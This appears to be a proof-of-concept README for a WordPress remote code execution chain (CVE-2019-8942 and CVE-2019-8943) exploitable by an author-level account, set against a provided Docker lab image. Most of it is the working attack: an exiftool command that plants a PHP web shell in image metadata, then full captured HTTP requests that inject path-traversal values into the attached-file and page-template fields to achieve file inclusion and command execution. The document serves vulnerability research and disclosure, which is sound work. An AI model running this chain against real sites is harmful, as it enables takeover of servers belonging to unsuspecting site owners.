# Summary
A simple PoC for WordPress RCE (author priviledge), refer to CVE-2019-8942 and CVE-2019-8943.

# Affected Version
* WordPress <= 4.9.8 (verified)
* WordPress <= 5.0.0

# Test Environment
## Docker Image
* `docker pull avfisherdocker/wordpress:4.9.8`
* `docker run -d -p 80:80 avfisherdocker/wordpress:4.9.8`

## Mysql & WordPress Info
|Type|Username|Password|
|---|---|---|
|mysql|root|root|
|wordpress|admin|admin4wp498
|wordpress|author|author4wp498

# Proof of Concepts

#### 1. Start Burp to intercept the traffic

#### 2. Create malicous image file in `poc.jpg` by exiftool
* `exiftool poc.jpg -documentname="<?php echo exec(\$_POST['cmd']); ?>"`

#### 3. Detect current theme by WPScan
* `wpscan -u <URL> -et`, e.g. `twentyseventeen` as default in wordpress 4.9.8

#### 4. Upload the payload image file `poc.jpg`
* Login the `author` account;
* Click `Media` - `Add New` in the Dashboard to upload `poc.jpg` file;
* Select the uploaded picture and click `Edit more details` - `Update`;
* Check in Burp you will see a POST request `/wp-admin/post.php` similar as below and then send it to Repeater:

```
POST /wp-admin/post.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://34.211.248.202/wp-admin/post.php?post=6&action=edit
Content-Type: application/x-www-form-urlencoded
Content-Length: 832
Cookie: wordpress_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cc9a1b8db83347d7e7893f8b871033a3cf8c8d90c0164b9e293e397a46da02df8; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cd0d730cf25331c60b4c2ff475f5d9b38ed95d308dcc3452eba307eaa6367d9d8; wp-settings-time-2=1551126207
Connection: close
Upgrade-Insecure-Requests: 1

_wpnonce=ab3340b93c&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&user_ID=2&action=editpost&originalaction=editpost&post_author=2&post_type=attachment&original_post_status=inherit&referredby=http%3A%2F%2F34.211.248.202%2Fwp-admin%2Fupload.php%3Fitem%3D6&_wp_original_http_referer=http%3A%2F%2F34.211.248.202%2Fwp-admin%2Fupload.php%3Fitem%3D6&post_ID=6&meta-box-order-nonce=539523098a&closedpostboxesnonce=f7481e5cf7&post_title=poc&samplepermalinknonce=90f8d66414&excerpt=&_wp_attachment_image_alt=&content=&attachment_url=http%3A%2F%2F34.211.248.202%2Fwp-content%2Fuploads%2F2019%2F02%2Fpoc.jpg&original_publish=Update&save=Update&advanced_view=1&comment_status=open&add_comment_nonce=e7116231cd&_ajax_fetch_list_nonce=0163224a2a&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&post_name=poc
```

#### 5. Crop the image
* Go to `Media` and select the image uploaded in step 4;
* Click `Edit Image` to crop the image and then click `Save`;
* Check in Burp you will see a POST request `/wp-admin/admin-ajax.php` similar as below and then send it to Repeater:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://34.211.248.202/wp-admin/upload.php?item=6&mode=edit
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 174
Cookie: wordpress_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cc9a1b8db83347d7e7893f8b871033a3cf8c8d90c0164b9e293e397a46da02df8; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cd0d730cf25331c60b4c2ff475f5d9b38ed95d308dcc3452eba307eaa6367d9d8; wp-settings-time-2=1551126785
Connection: close

action=image-editor&_ajax_nonce=0fc4799ff5&postid=6&history=%5B%7B%22c%22%3A%7B%22x%22%3A10%2C%22y%22%3A13%2C%22w%22%3A32%2C%22h%22%3A26%7D%7D%5D&target=full&context=&do=save
```

#### 6. Update attached file to `poc.jpg#/poc.jpg`
* Add `&meta_input[_wp_attached_file]=<CURRENT YEAT>/<CURRENT MONTH>/poc.jpg#/poc.jpg` (e.g. `&meta_input[_wp_attached_file]=2019/02/poc.jpg#/poc.jpg` for February, 2019) in the POST request `/wp-admin/post.php` captured in step 4 in Burp Repeater similar as below and then click `Go`.

```
POST /wp-admin/post.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://34.211.248.202/wp-admin/post.php?post=6&action=edit
Content-Type: application/x-www-form-urlencoded
Content-Length: 832
Cookie: wordpress_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cc9a1b8db83347d7e7893f8b871033a3cf8c8d90c0164b9e293e397a46da02df8; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cd0d730cf25331c60b4c2ff475f5d9b38ed95d308dcc3452eba307eaa6367d9d8; wp-settings-time-2=1551126207
Connection: close
Upgrade-Insecure-Requests: 1

_wpnonce=ab3340b93c&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&user_ID=2&action=editpost&originalaction=editpost&post_author=2&post_type=attachment&original_post_status=inherit&referredby=http%3A%2F%2F34.211.248.202%2Fwp-admin%2Fupload.php%3Fitem%3D6&_wp_original_http_referer=http%3A%2F%2F34.211.248.202%2Fwp-admin%2Fupload.php%3Fitem%3D6&post_ID=6&meta-box-order-nonce=539523098a&closedpostboxesnonce=f7481e5cf7&post_title=poc&samplepermalinknonce=90f8d66414&excerpt=&_wp_attachment_image_alt=&content=&attachment_url=http%3A%2F%2F34.211.248.202%2Fwp-content%2Fuploads%2F2019%2F02%2Fpoc.jpg&original_publish=Update&save=Update&advanced_view=1&comment_status=open&add_comment_nonce=e7116231cd&_ajax_fetch_list_nonce=0163224a2a&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&post_name=poc&meta_input[_wp_attached_file]=2019/02/poc.jpg#/poc.jpg
```

#### 7. Crop the image
* Repeat the POST request `/wp-admin/admin-ajax.php` captured in step 5 in Burp Repeater.

#### 8. Update attached file to `poc.jpg#/../../../../themes/<CURRENT THEME>/poc.jpg`
* Update as  `&meta_input[_wp_attached_file]=<CURRENT YEAR>/<CURRENT MONTH>/poc.jpg#/../../../../themes/<CURRENT THEME>/poc.jpg` (e.g. `&meta_input[_wp_attached_file]=2019/02/poc.jpg#/../../../../themes/twentyseventeen/poc.jpg` for February, 2019) in the POST request `/wp-admin/post.php` captured in step 4 in Burp Repeater similar as below and click `Go`.

```
POST /wp-admin/post.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://34.211.248.202/wp-admin/post.php?post=6&action=edit
Content-Type: application/x-www-form-urlencoded
Content-Length: 832
Cookie: wordpress_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cc9a1b8db83347d7e7893f8b871033a3cf8c8d90c0164b9e293e397a46da02df8; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_9f977c8ffc2c97b0c848277689037ed1=author%7C1551298764%7CkwllUoWifopUBYobsNWYqsJTJ1tnI3enLdT6Hx4GdoR%7Cd0d730cf25331c60b4c2ff475f5d9b38ed95d308dcc3452eba307eaa6367d9d8; wp-settings-time-2=1551126207
Connection: close
Upgrade-Insecure-Requests: 1

_wpnonce=ab3340b93c&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&user_ID=2&action=editpost&originalaction=editpost&post_author=2&post_type=attachment&original_post_status=inherit&referredby=http%3A%2F%2F34.211.248.202%2Fwp-admin%2Fupload.php%3Fitem%3D6&_wp_original_http_referer=http%3A%2F%2F34.211.248.202%2Fwp-admin%2Fupload.php%3Fitem%3D6&post_ID=6&meta-box-order-nonce=539523098a&closedpostboxesnonce=f7481e5cf7&post_title=poc&samplepermalinknonce=90f8d66414&excerpt=&_wp_attachment_image_alt=&content=&attachment_url=http%3A%2F%2F34.211.248.202%2Fwp-content%2Fuploads%2F2019%2F02%2Fpoc.jpg&original_publish=Update&save=Update&advanced_view=1&comment_status=open&add_comment_nonce=e7116231cd&_ajax_fetch_list_nonce=0163224a2a&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&post_name=poc&meta_input[_wp_attached_file]=2019/02/poc.jpg#/../../../../themes/twentyseventeen/poc.jpg
```

#### 9. Crop the image
* Repeat the POST request `/wp-admin/admin-ajax.php` captured in step 5 in Burp Repeater;
* Take a note on the cropped image file name, e.g. `poc-e1551133870454.jpg`.
![](http://avfisher.win/wp-content/uploads/2019/03/step_9.png)

#### 10. Create the post carrying the payload by adding a post
* Click `Posts` - `Add New` to create a new post and click `Publish`;
* Check in Burp you will see a POST request `/wp-admin/post.php` similar as below and then send it to Repeater:

```
POST /wp-admin/post.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://180.76.234.24/wp-admin/post-new.php?wp-post-new-reload=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 1116
Cookie: wp-saving-post=7-check; wp-saving-post=10-saved; wordpress_21006e0e4224057a8cdfd0bb01a98baa=author%7C1551306468%7CGGxuLa225e31DAfLkssKbzMOiOdk6K4grU75SWKw2tO%7C9f3191099eadc9810a0a7f0ec2a9caa5ceed7f86be6100640b7d444c89f2cc1a; wordpress_test_cookie=WP+Cookie+check; wp-settings-time-2=1551134027; wordpress_logged_in_21006e0e4224057a8cdfd0bb01a98baa=author%7C1551306468%7CGGxuLa225e31DAfLkssKbzMOiOdk6K4grU75SWKw2tO%7C85b467e06eb3b1461380c8672c848b04bf78da7e0c637ba0af40634b437da039
Connection: close
Upgrade-Insecure-Requests: 1

_wpnonce=16f64ed1dd&_wp_http_referer=%2Fwp-admin%2Fpost-new.php&user_ID=2&action=editpost&originalaction=editpost&post_author=2&post_type=post&original_post_status=auto-draft&referredby=http%3A%2F%2F180.76.234.24%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2F180.76.234.24%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&auto_draft=&post_ID=7&meta-box-order-nonce=32fc2f4c9b&closedpostboxesnonce=f550a7dc60&post_title=Here+is+the+PoC&samplepermalinknonce=d703c244b8&content=Here+is+the+PoC.&wp-preview=&hidden_post_status=draft&post_status=draft&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=02&jj=25&aa=2019&hh=22&mn=33&ss=47&hidden_mm=02&cur_mm=02&hidden_jj=25&cur_jj=25&hidden_aa=2019&cur_aa=2019&hidden_hh=22&cur_hh=22&hidden_mn=33&cur_mn=33&original_publish=Publish&publish=Publish&post_format=0&post_category%5B%5D=0&tax_input%5Bpost_tag%5D=&newtag%5Bpost_tag%5D=&_thumbnail_id=-1&excerpt=&trackback_url=&metakeyinput=&metavalue=&_ajax_nonce-add-meta=ba64f17c06&advanced_view=1&comment_status=open&ping_status=open&post_name=
```

* Add `&meta_input[_wp_page_template]=<cropped image file name noted in step 9>` in the POST request `/wp-admin/post.php` captured in last step in Burp Repeater similar as below and then click `Go`:

```
POST /wp-admin/post.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://180.76.234.24/wp-admin/post-new.php?wp-post-new-reload=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 1116
Cookie: wp-saving-post=7-check; wp-saving-post=10-saved; wordpress_21006e0e4224057a8cdfd0bb01a98baa=author%7C1551306468%7CGGxuLa225e31DAfLkssKbzMOiOdk6K4grU75SWKw2tO%7C9f3191099eadc9810a0a7f0ec2a9caa5ceed7f86be6100640b7d444c89f2cc1a; wordpress_test_cookie=WP+Cookie+check; wp-settings-time-2=1551134027; wordpress_logged_in_21006e0e4224057a8cdfd0bb01a98baa=author%7C1551306468%7CGGxuLa225e31DAfLkssKbzMOiOdk6K4grU75SWKw2tO%7C85b467e06eb3b1461380c8672c848b04bf78da7e0c637ba0af40634b437da039
Connection: close
Upgrade-Insecure-Requests: 1

_wpnonce=16f64ed1dd&_wp_http_referer=%2Fwp-admin%2Fpost-new.php&user_ID=2&action=editpost&originalaction=editpost&post_author=2&post_type=post&original_post_status=auto-draft&referredby=http%3A%2F%2F180.76.234.24%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2F180.76.234.24%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%3Dedit&auto_draft=&post_ID=7&meta-box-order-nonce=32fc2f4c9b&closedpostboxesnonce=f550a7dc60&post_title=Here+is+the+PoC&samplepermalinknonce=d703c244b8&content=Here+is+the+PoC.&wp-preview=&hidden_post_status=draft&post_status=draft&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=02&jj=25&aa=2019&hh=22&mn=33&ss=47&hidden_mm=02&cur_mm=02&hidden_jj=25&cur_jj=25&hidden_aa=2019&cur_aa=2019&hidden_hh=22&cur_hh=22&hidden_mn=33&cur_mn=33&original_publish=Publish&publish=Publish&post_format=0&post_category%5B%5D=0&tax_input%5Bpost_tag%5D=&newtag%5Bpost_tag%5D=&_thumbnail_id=-1&excerpt=&trackback_url=&metakeyinput=&metavalue=&_ajax_nonce-add-meta=ba64f17c06&advanced_view=1&comment_status=open&ping_status=open&post_name=&meta_input[_wp_page_template]=poc-e1551133870454.jpg
```

* Take a note on the post id, e.g. `post_ID=7`.

#### 11. Trigger the LFI for arbitrary code execution by accessing the post with the payload

* Send a POST request to `http://127.0.0.1/?p=7` with data `cmd=id`, you will see the code has been executed successfully.
![](http://avfisher.win/wp-content/uploads/2019/02/step_11.png)

# Reference
* <https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/>
* <https://nvd.nist.gov/vuln/detail/CVE-2019-8942>
* <https://nvd.nist.gov/vuln/detail/CVE-2019-8943>
